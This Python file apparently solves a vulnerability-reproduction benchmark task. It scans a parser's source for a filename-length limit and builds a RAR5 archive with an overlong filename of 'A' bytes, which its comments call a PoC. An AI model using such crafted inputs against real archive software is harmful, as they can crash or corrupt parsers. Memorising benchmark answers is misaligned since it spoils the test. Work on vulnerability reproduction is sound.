import os
import re
import tarfile
import zlib
from typing import Optional, Tuple, List, Dict


RAR5_SIGNATURE = b"Rar!\x1a\x07\x01\x00"


def _le32(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _u32le(b: bytes, off: int) -> int:
    return int.from_bytes(b[off:off + 4], "little", signed=False)


def _encode_vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _decode_vint(buf: bytes, off: int) -> Tuple[int, int, int]:
    n = 0
    shift = 0
    start = off
    for _ in range(11):
        if off >= len(buf):
            raise ValueError("vint eof")
        b = buf[off]
        off += 1
        n |= (b & 0x7F) << shift
        if (b & 0x80) == 0:
            return n, off, off - start
        shift += 7
    raise ValueError("vint too long")


def _crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


class Solution:
    MODE_SIZE_EXCLUDES_SIZEFIELD = 0  # header_size == len(header_data)
    MODE_SIZE_INCLUDES_SIZEFIELD = 1  # header_size includes the sizefield itself (excluding CRC)

    def solve(self, src_path: str) -> bytes:
        max_name = self._find_name_limit(src_path)
        desired_len = max_name + 1
        if desired_len < 1025:
            desired_len = 1025

        sample = self._find_rar5_sample(src_path)
        if sample and sample.startswith(RAR5_SIGNATURE):
            mode = self._infer_size_mode_from_sample(sample)
            blocks = self._parse_blocks(sample, mode)
            file_blk = None
            for b in blocks:
                if b.get("type") == 2:
                    file_blk = b
                    break
            if file_blk is not None:
                try:
                    modified_block = self._modify_file_block(file_blk, desired_len, mode)
                    new_bytes = sample[:file_blk["start"]] + modified_block + sample[file_blk["end"]:]
                    delta = len(modified_block) - (file_blk["end"] - file_blk["start"])

                    end_blk = None
                    for b in blocks:
                        if b.get("type") == 5 and b["start"] > file_blk["end"]:
                            end_blk = b
                            break
                    if end_blk is not None:
                        new_end = end_blk["end"] + delta
                        if 0 < new_end <= len(new_bytes):
                            new_bytes = new_bytes[:new_end]
                    return new_bytes
                except Exception:
                    pass

        mode = self._infer_size_mode_from_source(src_path)
        return self._build_minimal_poc(desired_len, mode)

    def _find_name_limit(self, src_path: str) -> int:
        candidates: List[int] = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if "rar5" not in name and "rar" not in name:
                        continue
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h")):
                        continue
                    if m.size <= 0 or m.size > 8_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue

                    for mo in re.finditer(r'\b\w*(?:name|filename)\w*size\w*\b\s*(?:>=|>)\s*(0x[0-9a-fA-F]+|\d+)', text):
                        v = int(mo.group(1), 0)
                        if 64 <= v <= 16384:
                            candidates.append(v)

                    for mo in re.finditer(r'#define\s+\w*(?:NAME|FILENAME)\w*(?:MAX|LIMIT)\w*\s+(0x[0-9a-fA-F]+|\d+)', text):
                        v = int(mo.group(1), 0)
                        if 64 <= v <= 16384:
                            candidates.append(v)

                    for line in text.splitlines():
                        lo = line.lower()
                        if "name" in lo and ("max" in lo or "limit" in lo) and ("rar" in lo):
                            mo = re.search(r'(0x[0-9a-fA-F]+|\d+)', line)
                            if mo:
                                v = int(mo.group(1), 0)
                                if 64 <= v <= 16384:
                                    candidates.append(v)
        except Exception:
            pass

        if candidates:
            return min(candidates)
        return 1024

    def _find_rar5_sample(self, src_path: str) -> Optional[bytes]:
        best = None
        best_size = None
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size < 16 or m.size > 1_000_000:
                        continue
                    lname = m.name.lower()
                    if not (lname.endswith(".rar") or lname.endswith(".cbr") or lname.endswith(".bin") or "rar5" in lname or "rar" in lname):
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    head = f.read(8)
                    if head != RAR5_SIGNATURE:
                        continue
                    f.seek(0)
                    data = f.read()
                    if not data.startswith(RAR5_SIGNATURE):
                        continue
                    if best is None or (best_size is not None and m.size < best_size):
                        best = data
                        best_size = m.size
        except Exception:
            return None
        return best

    def _infer_size_mode_from_sample(self, data: bytes) -> int:
        if not data.startswith(RAR5_SIGNATURE):
            return self.MODE_SIZE_EXCLUDES_SIZEFIELD
        score0 = self._count_valid_crc_blocks(data, self.MODE_SIZE_EXCLUDES_SIZEFIELD)
        score1 = self._count_valid_crc_blocks(data, self.MODE_SIZE_INCLUDES_SIZEFIELD)
        if score1 > score0:
            return self.MODE_SIZE_INCLUDES_SIZEFIELD
        return self.MODE_SIZE_EXCLUDES_SIZEFIELD

    def _count_valid_crc_blocks(self, data: bytes, mode: int) -> int:
        pos = 8
        ok = 0
        for _ in range(64):
            if pos + 6 > len(data):
                break
            try:
                crc = _u32le(data, pos)
                hs_val, p2, hs_len = _decode_vint(data, pos + 4)
                hs_bytes = data[pos + 4:p2]
                if mode == self.MODE_SIZE_EXCLUDES_SIZEFIELD:
                    hdr_len = hs_val
                else:
                    hdr_len = hs_val - hs_len
                if hdr_len < 0:
                    break
                header_data_end = p2 + hdr_len
                if header_data_end > len(data):
                    break
                header_data = data[p2:header_data_end]
                if _crc32(hs_bytes + header_data) != crc:
                    break
                data_size = self._extract_data_size(header_data)
                block_end = header_data_end + data_size
                if block_end > len(data):
                    break
                ok += 1
                pos = block_end
            except Exception:
                break
        return ok

    def _extract_data_size(self, header_data: bytes) -> int:
        try:
            t, off, _ = _decode_vint(header_data, 0)
            flags, off, _ = _decode_vint(header_data, off)
            if flags & 0x0001:
                extra_size, off, _ = _decode_vint(header_data, off)
                if extra_size < 0:
                    return 0
            if flags & 0x0002:
                data_size, off, _ = _decode_vint(header_data, off)
                if 0 <= data_size <= 1_000_000_000:
                    return int(data_size)
            return 0
        except Exception:
            return 0

    def _parse_blocks(self, data: bytes, mode: int) -> List[Dict]:
        blocks: List[Dict] = []
        if not data.startswith(RAR5_SIGNATURE):
            return blocks
        pos = 8
        for _ in range(256):
            if pos + 6 > len(data):
                break
            crc = _u32le(data, pos)
            try:
                hs_val, p2, hs_len = _decode_vint(data, pos + 4)
            except Exception:
                break
            hs_bytes = data[pos + 4:p2]
            if mode == self.MODE_SIZE_EXCLUDES_SIZEFIELD:
                hdr_len = hs_val
            else:
                hdr_len = hs_val - hs_len
            if hdr_len < 0:
                break
            header_data_end = p2 + hdr_len
            if header_data_end > len(data):
                break
            header_data = data[p2:header_data_end]
            try:
                head_type, off, _ = _decode_vint(header_data, 0)
                head_flags, off, _ = _decode_vint(header_data, off)
                extra_size = 0
                if head_flags & 0x0001:
                    extra_size, off, _ = _decode_vint(header_data, off)
                    if extra_size < 0:
                        extra_size = 0
                data_size = 0
                if head_flags & 0x0002:
                    data_size, off, _ = _decode_vint(header_data, off)
                    if data_size < 0:
                        data_size = 0
            except Exception:
                head_type = None
                head_flags = 0
                extra_size = 0
                data_size = 0

            data_end = header_data_end + int(data_size)
            if data_end > len(data):
                break
            blocks.append({
                "start": pos,
                "end": data_end,
                "crc": crc,
                "hs_val": hs_val,
                "hs_len": hs_len,
                "hs_bytes": hs_bytes,
                "header_data": header_data,
                "data_bytes": data[header_data_end:data_end],
                "type": head_type,
                "flags": head_flags,
                "extra_size": int(extra_size),
            })
            pos = data_end
        return blocks

    def _locate_name_field(self, header_data: bytes, extra_size: int) -> Optional[Tuple[int, int, int]]:
        end_fields = len(header_data) - max(0, extra_size)
        if end_fields < 0:
            end_fields = len(header_data)
        # Try to find a vint that makes the filename end exactly at end_fields
        for i in range(0, max(0, end_fields)):
            try:
                L, off, Llen = _decode_vint(header_data, i)
            except Exception:
                continue
            j = i + Llen
            if L <= 0:
                continue
            if j + L != end_fields:
                continue
            return i, j, int(L)
        # Fallback: find a plausible name close to end_fields
        best = None
        for i in range(0, max(0, end_fields)):
            try:
                L, off, Llen = _decode_vint(header_data, i)
            except Exception:
                continue
            j = i + Llen
            if L <= 0 or L > end_fields - j:
                continue
            if end_fields - (j + L) > 8:
                continue
            best = (i, j, int(L))
        return best

    def _calc_hs_bytes(self, mode: int, header_data_len: int) -> bytes:
        if mode == self.MODE_SIZE_EXCLUDES_SIZEFIELD:
            return _encode_vint(header_data_len)
        # mode includes sizefield: hs_val = header_data_len + len(hs_bytes)
        for l in range(1, 12):
            hs_val = header_data_len + l
            hs_bytes = _encode_vint(hs_val)
            if len(hs_bytes) == l:
                return hs_bytes
        hs_val = header_data_len + len(_encode_vint(header_data_len))
        return _encode_vint(hs_val)

    def _rebuild_block(self, header_data: bytes, data_bytes: bytes, mode: int) -> bytes:
        hs_bytes = self._calc_hs_bytes(mode, len(header_data))
        crc = _crc32(hs_bytes + header_data)
        return _le32(crc) + hs_bytes + header_data + data_bytes

    def _modify_file_block(self, blk: Dict, desired_len: int, mode: int) -> bytes:
        header_data = blk["header_data"]
        extra_size = int(blk.get("extra_size", 0))
        loc = self._locate_name_field(header_data, extra_size)
        if loc is None:
            raise ValueError("name field not found")
        i, j, old_len = loc
        end_fields = len(header_data) - max(0, extra_size)
        if end_fields < 0:
            end_fields = len(header_data)
        suffix = header_data[end_fields:]
        prefix = header_data[:i]
        new_name = b"A" * int(desired_len)
        new_header_data = prefix + _encode_vint(int(desired_len)) + new_name + suffix
        return self._rebuild_block(new_header_data, blk["data_bytes"], mode)

    def _infer_size_mode_from_source(self, src_path: str) -> int:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    lname = m.name.lower()
                    if "rar5" not in lname:
                        continue
                    if not (lname.endswith(".c") or lname.endswith(".cc") or lname.endswith(".cpp")):
                        continue
                    if m.size <= 0 or m.size > 8_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    text = f.read().decode("utf-8", errors="ignore")
                    if re.search(r'\bheader_?size\s*-\s*\w*len\b', text) or "header_size - header_size_len" in text:
                        return self.MODE_SIZE_INCLUDES_SIZEFIELD
                    if re.search(r'\bheader_?size\s*-=\s*', text):
                        return self.MODE_SIZE_INCLUDES_SIZEFIELD
                    if "includes itself" in text.lower() and "header_size" in text.lower():
                        return self.MODE_SIZE_INCLUDES_SIZEFIELD
        except Exception:
            pass
        return self.MODE_SIZE_INCLUDES_SIZEFIELD

    def _build_minimal_poc(self, desired_len: int, mode: int) -> bytes:
        # Construct a minimal RAR5-like stream:
        # Signature + Main header + File header (directory entry, no data) + End header
        # This may not work for all parsers; used only if no sample found.
        sig = RAR5_SIGNATURE

        # Main header: type=1, flags=0, main_flags=0
        main_header_data = _encode_vint(1) + _encode_vint(0) + _encode_vint(0)
        main_block = self._rebuild_block(main_header_data, b"", mode)

        # File header: type=2, flags=0 (no extra, no data)
        # Body: file_flags=1 (dir), unpacked_size=0, attrib=0, comp_info=0, host_os=0, name_len, name
        name = b"A" * int(desired_len)
        file_body = (
            _encode_vint(1) +          # file_flags (directory)
            _encode_vint(0) +          # unpacked_size
            _encode_vint(0) +          # attributes
            _encode_vint(0) +          # comp_info
            _encode_vint(0) +          # host_os
            _encode_vint(len(name)) +  # name_len
            name
        )
        file_header_data = _encode_vint(2) + _encode_vint(0) + file_body
        file_block = self._rebuild_block(file_header_data, b"", mode)

        # End header: type=5, flags=0, end_flags=0
        end_header_data = _encode_vint(5) + _encode_vint(0) + _encode_vint(0)
        end_block = self._rebuild_block(end_header_data, b"", mode)

        return sig + main_block + file_block + end_block